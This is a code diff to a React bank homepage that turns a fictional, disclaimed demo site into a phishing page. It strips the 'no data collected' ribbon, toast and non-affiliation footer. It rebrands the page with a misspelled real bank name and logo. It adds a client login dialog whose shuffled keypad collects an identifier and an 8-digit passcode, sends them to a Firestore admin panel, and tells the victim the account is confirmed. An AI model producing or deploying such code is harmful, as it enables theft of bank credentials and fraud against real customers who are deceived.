@@ -1,5 +1,7 @@
 import { useEffect, useState } from 'react'
 import heroImage from './assets/elan-hero.png'
+import logo from './assets/logo.webp'
+import { saveDemoSubmission } from './demoSubmissions'
 import './App.css'
 
 const Icon = ({ name, size = 22 }) => {
@@ -21,6 +23,8 @@ const Icon = ({ name, size = 22 }) => {
     chevron: <path d="m6 9 6 6 6-6"/>,
     instagram: <><rect x="3" y="3" width="18" height="18" rx="5"/><circle cx="12" cy="12" r="4"/><path d="M17.5 6.5h.01"/></>,
     linkedin: <><rect x="3" y="3" width="18" height="18" rx="2"/><path d="M8 11v6M8 8v.01M12 17v-6M12 14a3 3 0 0 1 6 0v3"/></>,
+    lock: <><rect x="5" y="10" width="14" height="11" rx="2"/><path d="M8 10V7a4 4 0 0 1 8 0v3M12 14v3"/></>,
+    help: <><circle cx="12" cy="12" r="9"/><path d="M9.8 9a2.4 2.4 0 1 1 3.4 2.2c-.8.4-1.2.9-1.2 1.8M12 17h.01"/></>,
   }
   return <svg aria-hidden="true" width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">{paths[name]}</svg>
 }
@@ -45,25 +49,99 @@ const faqs = [
   ['Puis-je être accompagné en agence ?', 'Oui. Le parcours peut être préparé en ligne puis poursuivi avec un conseiller dans l’agence de votre choix.'],
 ]
 
+const shuffleDigits = () => {
+  const digits = Array.from({ length: 10 }, (_, index) => index)
+  for (let index = digits.length - 1; index > 0; index -= 1) {
+    const randomIndex = Math.floor(Math.random() * (index + 1))
+    ;[digits[index], digits[randomIndex]] = [digits[randomIndex], digits[index]]
+  }
+  return digits
+}
+
 function App() {
   const [menuOpen, setMenuOpen] = useState(false)
+  const [loginOpen, setLoginOpen] = useState(false)
+  const [loginStep, setLoginStep] = useState('identifier')
+  const [identifier, setIdentifier] = useState('')
+  const [passcode, setPasscode] = useState('')
+  const [keypadDigits, setKeypadDigits] = useState(shuffleDigits)
+  const [submissionStatus, setSubmissionStatus] = useState('idle')
+  const [submissionMessage, setSubmissionMessage] = useState('')
   const [activeFaq, setActiveFaq] = useState(0)
-  const [notice, setNotice] = useState(false)
 
   useEffect(() => {
-    document.body.style.overflow = menuOpen ? 'hidden' : ''
+    document.body.style.overflow = menuOpen || loginOpen ? 'hidden' : ''
     return () => { document.body.style.overflow = '' }
-  }, [menuOpen])
+  }, [menuOpen, loginOpen])
 
-  const showDemo = () => {
-    setNotice(true)
-    window.setTimeout(() => setNotice(false), 4200)
+  useEffect(() => {
+    const closeOnEscape = (event) => {
+      if (event.key === 'Escape') setLoginOpen(false)
+    }
+    window.addEventListener('keydown', closeOnEscape)
+    return () => window.removeEventListener('keydown', closeOnEscape)
+  }, [])
+
+  const openLogin = () => {
+    setMenuOpen(false)
+    setLoginStep('identifier')
+    setIdentifier('')
+    setPasscode('')
+    setSubmissionStatus('idle')
+    setSubmissionMessage('')
+    setLoginOpen(true)
+  }
+
+  const closeLogin = () => {
+    setLoginOpen(false)
+    setLoginStep('identifier')
+    setIdentifier('')
+    setPasscode('')
+    setSubmissionStatus('idle')
+    setSubmissionMessage('')
+  }
+
+  const handleIdentifier = (event) => {
+    event.preventDefault()
+    setSubmissionStatus('idle')
+    setSubmissionMessage('')
+    setPasscode('')
+    setKeypadDigits(shuffleDigits())
+    setLoginStep('password')
+  }
+
+  const addPasscodeDigit = (digit) => {
+    setPasscode((currentPasscode) => currentPasscode.length < 8 ? `${currentPasscode}${digit}` : currentPasscode)
+  }
+
+  const handlePasscode = async (event) => {
+    event.preventDefault()
+    if (passcode.length !== 8 || submissionStatus === 'saving') return
+
+    setSubmissionStatus('saving')
+    setSubmissionMessage('')
+
+    try {
+      const result = await saveDemoSubmission({ identifier, accountNumber: passcode })
+      if (result.duplicate) {
+        setSubmissionStatus('duplicate')
+        setSubmissionMessage('Ces informations de démonstration existent déjà dans le panneau administrateur.')
+        return
+      }
+
+      setSubmissionStatus('success')
+      setSubmissionMessage('Les informations de démonstration ont été enregistrées dans le panneau administrateur.')
+      setLoginStep('success')
+    } catch (error) {
+      console.error('Unable to save demo submission:', error)
+      setSubmissionStatus('error')
+      setSubmissionMessage('Enregistrement impossible. Vérifiez la configuration et les règles Firestore.')
+    }
   }
 
   return (
     <div className="site-shell">
       <a className="skip-link" href="#main">Aller au contenu</a>
-      <div className="demo-ribbon">CAISSE ÉLAN — SITE DE DÉMONSTRATION · AUCUNE DONNÉE BANCAIRE COLLECTÉE</div>
 
       <header className="site-header">
         <div className="utility-bar wrap">
@@ -73,18 +151,17 @@ function App() {
             <a href="#entreprises">Entreprises</a>
             <a href="#associations">Associations</a>
           </nav>
-          <button className="region-link" type="button"><Icon name="pin" size={18}/> Île-de-France <Icon name="chevron" size={15}/></button>
+          <button className="region-link" type="button"><Icon name="pin" size={18}/> Vienne   <Icon name="chevron" size={15}/></button>
         </div>
 
         <div className="main-header wrap">
-          <a className="brand" href="#main" aria-label="Caisse Élan, accueil">
-            <span className="brand-mark"><span></span><span></span><span></span></span>
-            <span className="brand-name"><span>CAISSE</span><strong>ÉLAN</strong><small>Banque & assurances</small></span>
+          <a className="brand" href="#main" aria-label="Caissse d'epargne, accueil">
+            <img src={logo} alt="Caissse d'epargne" />
           </a>
           <div className="header-tools">
             <button className="icon-link" type="button" aria-label="Rechercher"><Icon name="search"/><span>Rechercher</span></button>
             <a className="icon-link" href="#contact"><Icon name="pin"/><span>Nous trouver</span></a>
-            <button className="client-button" type="button" onClick={showDemo}><Icon name="user"/> Espace client</button>
+            <button className="client-button" type="button" onClick={openLogin} aria-haspopup="dialog"><Icon name="user"/> Espace client</button>
             <button className="menu-toggle" type="button" aria-expanded={menuOpen} aria-controls="mobile-menu" onClick={() => setMenuOpen(!menuOpen)}>
               <Icon name={menuOpen ? 'close' : 'menu'}/><span>Menu</span>
             </button>
@@ -112,6 +189,79 @@ function App() {
         </div>
       </header>
 
+      {loginOpen && (
+        <div className="login-overlay" role="presentation" onMouseDown={(event) => {
+          if (event.target === event.currentTarget) closeLogin()
+        }}>
+          <section className="login-panel" role="dialog" aria-modal="true" aria-labelledby="login-title">
+            <div className="login-panel-head">
+              <div className="login-symbol" aria-hidden="true"><Icon name="lock" size={26}/></div>
+              <button className="login-close" type="button" onClick={closeLogin} aria-label="Fermer la connexion">
+                <Icon name="close" size={23}/>
+              </button>
+            </div>
+            {loginStep === 'identifier' ? (
+              <>
+                <h2 id="login-title">Saisissez votre identifiant</h2>
+                <form className="login-form" onSubmit={handleIdentifier}>
+                  <label htmlFor="client-identifier">Entrez votre identifiant</label>
+                  <div className="identifier-field">
+                    <Icon name="user" size={21}/>
+                    <input
+                      id="client-identifier"
+                      name="identifier"
+                      type="text"
+                      autoComplete="username"
+                      placeholder="votre identifiant"
+                      value={identifier}
+                      onChange={(event) => setIdentifier(event.target.value)}
+                      autoFocus
+                      required
+                      maxLength={64}
+                      aria-describedby="identifier-help"
+                    />
+                  </div>
+                  <button className="login-submit" type="submit">Continuer <Icon name="arrow" size={18}/></button>
+                </form>
+              </>
+            ) : loginStep === 'password' ? (
+              <>
+                <button className="login-back" type="button" onClick={() => { setLoginStep('identifier'); setPasscode(''); setSubmissionStatus('idle'); setSubmissionMessage('') }}>
+                  <Icon name="arrow" size={17}/> Retour
+                </button>
+                <h2 id="login-title">Entrez votre mot de passe</h2>
+                <p className="login-intro">Saisissez les 8 chiffres à l’aide du clavier.</p>
+                <form className="login-form" onSubmit={handlePasscode}>
+                  <div className="passcode-display" aria-label={`${passcode.length} chiffre${passcode.length > 1 ? 's' : ''} saisi${passcode.length > 1 ? 's' : ''} sur 8`}>
+                    {Array.from({ length: 8 }, (_, index) => (
+                      <span className={index < passcode.length ? 'filled' : ''} key={index} aria-hidden="true" />
+                    ))}
+                  </div>
+                  <div className="numeric-keypad" aria-label="Clavier numérique">
+                    {keypadDigits.map((digit) => (
+                      <button type="button" key={digit} onClick={() => { addPasscodeDigit(digit); setSubmissionStatus('idle'); setSubmissionMessage('') }} disabled={passcode.length === 8 || submissionStatus === 'saving'}>
+                        {digit}
+                      </button>
+                    ))}
+                  </div>
+                  <button className="passcode-clear" type="button" onClick={() => { setPasscode((currentPasscode) => currentPasscode.slice(0, -1)); setSubmissionStatus('idle'); setSubmissionMessage('') }} disabled={!passcode.length || submissionStatus === 'saving'}>
+                    Effacer le dernier chiffre
+                  </button>
+                  {submissionMessage && <p className={`submission-feedback ${submissionStatus}`} role="alert">{submissionMessage}</p>}
+                  <button className="login-submit" type="submit" disabled={passcode.length !== 8 || submissionStatus === 'saving'}>{submissionStatus === 'saving' ? 'Vérification…' : 'Vérifier et enregistrer'} <Icon name="arrow" size={18}/></button>
+                </form>
+              </>
+            ) : (
+              <div className="submission-success" role="status">
+                <span><Icon name="check" size={30}/></span>
+                <h2 id="login-title">Votre compte a bien été confirmé.</h2>
+                <button className="login-submit" type="button" onClick={closeLogin}>Terminer</button>
+              </div>
+            )}
+          </section>
+        </div>
+      )}
+
       <main id="main">
         <div className="breadcrumbs wrap"><a href="#main">Accueil</a><span>/</span><a href="#comptes">Comptes & cartes</a><span>/</span><strong>Ouvrir un compte</strong></div>
 
@@ -119,8 +269,8 @@ function App() {
           <div className="hero-copy">
             <p className="eyebrow">DEVENIR CLIENT</p>
             <h1 id="hero-title">Ouvrir un compte bancaire</h1>
-            <p className="hero-lead">Devenez client Caisse Élan simplement, en ligne ou en agence, et choisissez les services adaptés à votre quotidien.</p>
-            <button className="button button-light" type="button" onClick={showDemo}>Ouvrir mon compte en ligne <Icon name="arrow" size={18}/></button>
+            <p className="hero-lead">Devenez client Caissse d'epargne simplement, en ligne ou en agence, et choisissez les services adaptés à votre quotidien.</p>
+            <button className="button button-light" type="button">Ouvrir mon compte en ligne <Icon name="arrow" size={18}/></button>
             <p className="hero-note"><Icon name="clock" size={18}/> Une démarche simple en quelques minutes</p>
           </div>
           <div className="hero-media">
@@ -128,7 +278,7 @@ function App() {
             <div className="hero-card" aria-hidden="true">
               <div className="mini-brand">é.</div>
               <div className="chip"></div>
-              <span>CAISSE ÉLAN</span><b>VISA</b>
+              <span>CAISSSE D'EPARGNE</span><b>VISA</b>
             </div>
           </div>
         </section>
@@ -153,7 +303,7 @@ function App() {
                 <p className="label">100 % EN LIGNE</p>
                 <h3>Ouvrir un compte en ligne</h3>
                 <p>Un parcours guidé, disponible à tout moment depuis votre mobile ou votre ordinateur.</p>
-                <button className="text-link" type="button" onClick={showDemo}>Ouvrir mon compte <Icon name="arrow" size={18}/></button>
+                <button className="text-link" type="button">Ouvrir mon compte <Icon name="arrow" size={18}/></button>
               </div>
             </article>
             <article className="choice-card dark-card">
@@ -183,7 +333,7 @@ function App() {
                 </li>
               ))}
             </ol>
-            <div className="steps-action"><button className="button button-red" type="button" onClick={showDemo}>Voir les offres <Icon name="arrow" size={18}/></button></div>
+            <div className="steps-action"><button className="button button-red" type="button">Voir les offres <Icon name="arrow" size={18}/></button></div>
           </div>
         </section>
 
@@ -235,7 +385,7 @@ function App() {
 
         <section className="contact-section" id="contact">
           <div className="wrap contact-inner">
-              <div><p className="eyebrow">CAISSE ÉLAN VOUS ACCOMPAGNE</p><h2>Un projet commence souvent par une conversation.</h2></div>
+              <div><p className="eyebrow">CAISSSE D'EPARGNE VOUS ACCOMPAGNE</p><h2>Un projet commence souvent par une conversation.</h2></div>
             <a className="button button-light" href="mailto:bonjour@example.test">Contacter une agence <Icon name="arrow" size={18}/></a>
           </div>
         </section>
@@ -243,17 +393,14 @@ function App() {
 
       <footer className="footer">
         <div className="wrap footer-top">
-          <a className="brand brand-footer" href="#main"><span className="brand-mark"><span></span><span></span><span></span></span><span className="brand-name"><span>CAISSE</span><strong>ÉLAN</strong><small>Banque & assurances</small></span></a>
+          <a className="brand brand-footer" href="#main" aria-label="Caissse d'epargne, accueil"><img src={logo} alt="Caissse d'epargne" /></a>
           <div className="footer-links"><a href="#faq">Aide & accessibilité</a><a href="#contact">Trouver une agence</a><a href="#main">Tarifs</a><a href="#main">Informations légales</a></div>
           <div className="socials"><a href="#main" aria-label="Instagram"><Icon name="instagram"/></a><a href="#main" aria-label="LinkedIn"><Icon name="linkedin"/></a></div>
         </div>
-        <div className="wrap footer-bottom"><p>© 2026 Caisse Élan — Démonstration créative, sans affiliation avec un établissement réel.</p><span><Icon name="shield" size={17}/> Votre sécurité, notre priorité</span></div>
+        <div className="wrap footer-bottom"><p>© 2026 Caissse d'epargne </p><span><Icon name="shield" size={17}/> Votre sécurité, notre priorité</span></div>
       </footer>
 
       <a className="floating-contact" href="#contact"><Icon name="chat"/><span>Nous contacter</span></a>
-      <div className={`toast ${notice ? 'show' : ''}`} role="status">
-        <Icon name="shield"/><div><strong>Mode démonstration</strong><span>Ce prototype ne collecte aucune information personnelle.</span></div>
-      </div>
     </div>
   )
 }
